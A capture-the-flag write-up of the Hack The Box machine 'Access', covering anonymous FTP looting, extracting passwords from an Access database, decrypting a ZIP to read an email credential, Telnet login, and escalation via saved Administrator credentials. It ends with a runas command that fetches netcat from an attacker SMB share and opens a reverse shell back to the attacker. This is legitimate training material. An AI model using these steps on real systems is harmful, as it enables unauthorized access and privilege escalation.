# [access](https://app.hackthebox.com/machines/156)

> A Windows machine with an FTP server that allows anonymous access. It contains a Microsoft Access database file and an encrypted ZIP archive. One of the tables in the Microsoft Access database contains the password to decrypt the ZIP archive. The ZIP archive contains a single PST file which contains an email that discloses a credential that can be used to obtain a low-privileged Telnet shell. `Administrator`'s credential is saved in Windows Credential Manager, readable by the low-privileged user. This credential can be used to gain an elevated shell.

---

## Open Port Enumeration

The target is serving TCP ports 21 (FTP), 23 (Telnet), and 80 (HTTP).

```bash
$ sudo masscan -p1-65535 $TARGET_IP --rate=1000 -e tun0 --output-format grepable --output-filename enum/access.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-02-04 23:00:39 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat enum/access.masscan | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
21,23,80,
```

The target's FTP server allows anonymous login. Its web server appears to be IIS 7.5. Its operating system appears to be an older version of Windows (around Windows Server 2008).

```bash
$ sudo nmap -sC -sV -O -p21,23,80 $TARGET_IP -oA enum/access
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-04 18:04 EST
Nmap scan report for 10.129.152.72
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info:
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Embedded Standard 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: -2s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.70 seconds
```

---

## FTP Enumeration

Anonymously login to the target's FTP server. It contains two directories: `Backups` and `Engineer`.

```bash
$ ftp $TARGET_IP
Connected to 10.129.152.72.
220 Microsoft FTP Service
Name (10.129.152.72:tgihf): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
```

`Backups` has one file: `backup.mdb`.

```bash
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM              5652480 backup.mdb
```

`Engineer` has one file: `Access Control.zip`.

```bash
ftp> cd Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  12:16AM                10870 Access Control.zip
226 Transfer complete.
```

Grab both these files for analysis.

```bash
ftp> cd ../Backups
250 CWD command successful.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 28296 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
5652480 bytes received in 3.44 secs (1.5669 MB/s)
ftp> cd ../Engineer
250 CWD command successful.
ftp> get Access\ Control.zip
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 45 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
10870 bytes received in 0.14 secs (78.5557 kB/s)
```

`backup.mdb` is a [Microsoft Access database](https://www.microsoft.com/en-us/microsoft-365/access).

```bash
$ file backup.mdb
backup.mdb: Microsoft Access Database
```

`Access Control.zip` is a ZIP archive, but attemping to decompress it leads to the error `unsupported compression method 99`.

```bash
$ file Access\ Control.zip
Access Control.zip: Zip archive data, at least v2.0 to extract
$ unzip Access\ Control.zip
Archive:  Access Control.zip
   skipping: Access Control.pst      unsupported compression method 99
```

[According to Google](https://openwritings.net/pg/linux/unzip-error-unsupported-compression-method-99), this error indicates the archive is encrypted with AES encryption, which the `unzip` binary doesn't support. Attempting to decompress it with `7z` indicates that it is indeed password-protected, as `7z` prompts for a password and when given the wrong one, results in an empty file named `Access Control.pst`.

```bash
$ 7z x Access\ Control.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs 11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz (806C1),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870


Enter password (will not be echoed):
ERROR: Wrong password : Access Control.pst

Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1

$ ls
'Access Control.pst'  'Access Control.zip'   backup.mdb
$ ls -la Access\ Control.pst
-rw-r--r-- 1 tgihf tgihf 0 Aug 23  2018 'Access Control.pst'
```

---

## `backup` Microsoft Access Database Analysis

`backup.mdb` has numerous tables.

```bash
$ mdb-tables backup.mdb
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
```

Filter away the empty tables.

```bash
$ NONEMPTY_TABLES=$(for table in $(mdb-tables backup.mdb | tr ' ' '\n'); do echo -n "$table:$(mdb-count backup.mdb $table)" | grep -v ":0" | cut -d':' -f1; done)
$ echo $NONEMPTY_TABLES
acc_timeseg
acc_wiegandfmt
ACGroup
action_log
areaadmin
auth_user
DEPARTMENTS
deptadmin
LeaveClass
LeaveClass1
personnel_area
TBKEY
USERINFO
ACUnlockComb
AttParam
auth_group
SystemLog
```

Outputting each of the nonempty tables in JSON and looking through them, it appears the `auth_user` and `USERINFO` tables are the most interesting. They both have user information, including IDs, usernames, and passwords.

```bash
$ mdb-json backup.mdb auth_user | jq -s | jq '.[] | {id: .id, username: .username, password: .password}'
{
  "id": 25,
  "username": "admin",
  "password": "admin"
}
{
  "id": 27,
  "username": "engineer",
  "password": "access4u@security"
}
{
  "id": 28,
  "username": "backup_admin",
  "password": "admin"
}
```

```bash
$ mdb-json backup.mdb USERINFO | jq -s | jq '.[] | {id: .USERID, name: .name, lastname: .lastname, password: .PASSWORD}'
{
  "id": 1,
  "name": "John",
  "lastname": "Carter",
  "password": "020481"
}
{
  "id": 2,
  "name": "Mark",
  "lastname": "Smith",
  "password": "010101"
}
{
  "id": 3,
  "name": "Sunita",
  "lastname": "Rahman",
  "password": "000000"
}
{
  "id": 4,
  "name": "Mary",
  "lastname": "Jones",
  "password": "666666"
}
{
  "id": 5,
  "name": "Monica",
  "lastname": "Nunes",
  "password": "123321"
}
```

Attempt to use each of the passwords to decrypt `Access Control.zip`.

---

## PST Analysis

From the `backup.mdb`'s `auth_user` table, the password `access4u@security` successfully decrypts `Access Control.zip`. The only file in the archive is `Access Control.pst`.

```bash
$ 7z x Access\ Control.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs 11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz (806C1),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870


Enter password (will not be echoed):
Everything is Ok

Size:       271360
Compressed: 10870
$ file Access\ Control.pst
Access Control.pst: Microsoft Outlook email folder (>=2003)
```

Personal Storage Table (PST) is a Microsoft-proprietary file format for storing copies of messages, calendar events, and other items produced by Microsoft Exchange and Outlook.

Use `readpst` to extract the objects from the PST file. There appears to be a single email message. It's from `john@megacorp.com` with the subject `MegaCorp Access Control System "security" account` and addressed to `security@accesscontrolsystems.com`. It indicates that the password for the `security` account is `4Cc3ssC0ntr0ller`.

```bash
$ readpst Access\ Control.pst
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
$ cat Access\ Control.mbox
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-1733359247_-_-"


----boundary-LibPST-iamunique-1733359247_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-1733359247_-_-"

--alt---boundary-LibPST-iamunique-1733359247_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,



The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.



Regards,

John


--alt---boundary-LibPST-iamunique-1733359247_-_-
Content-Type: text/html; charset="us-ascii"

<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
        {font-family:"Cambria Math";
        panose-1:0 0 0 0 0 0 0 0 0 0;}
@font-face
        {font-family:Calibri;
        panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0in;
        margin-bottom:.0001pt;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
        {mso-style-priority:99;
        color:#0563C1;
        text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
        {mso-style-priority:99;
        color:#954F72;
        text-decoration:underline;}
p.msonormal0, li.msonormal0, div.msonormal0
        {mso-style-name:msonormal;
        mso-margin-top-alt:auto;
        margin-right:0in;
        mso-margin-bottom-alt:auto;
        margin-left:0in;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
span.EmailStyle18
        {mso-style-type:personal-compose;
        font-family:"Calibri",sans-serif;
        color:windowtext;}
.MsoChpDefault
        {mso-style-type:export-only;
        font-size:10.0pt;
        font-family:"Calibri",sans-serif;}
@page WordSection1
        {size:8.5in 11.0in;
        margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
        {page:WordSection1;}
--></style><!--[if gte mso 9]><xml>
<o:shapedefaults v:ext="edit" spidmax="1026" />
</xml><![endif]--><!--[if gte mso 9]><xml>
<o:shapelayout v:ext="edit">
<o:idmap v:ext="edit" data="1" />
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
--alt---boundary-LibPST-iamunique-1733359247_-_---

----boundary-LibPST-iamunique-1733359247_-_---
```

---

## Telnet Access as `security`

Use the credential `security`:`4Cc3ssC0ntr0ller` to access the target via Telnet and grab the user flag from `C:\Users\security\Desktop\user.txt`.

```batch
$ telnet 10.129.152.72
Trying 10.129.152.72...
Connected to 10.129.152.72.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: security
password:

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

---

## Saved Credential Privilege Escalation

`Administrator`'s credential is stored in Windows Credential Manager.

```batch
C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

Serve a Windows `netcat` binary via SMB and start a reverse shell listener.

```bash
$ sudo impacket-smbserver tgihf /usr/share/windows-binaries -smb2support
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Use the stored credential to execute a `netcat` reverse shell.

```batch
C:\Users\security>runas /savecred /user:ACCESS\Administrator "\\10.10.14.139\tgihf\nc.exe -nv 10.10.14.139 443 -e cmd.exe"
```

Catch the shell as `Administrator` and read the system flag from `C:\Users\Administrator\Desktop\root.txt`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.139] from (UNKNOWN) [10.129.152.72] 49160
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
access\administrator
```
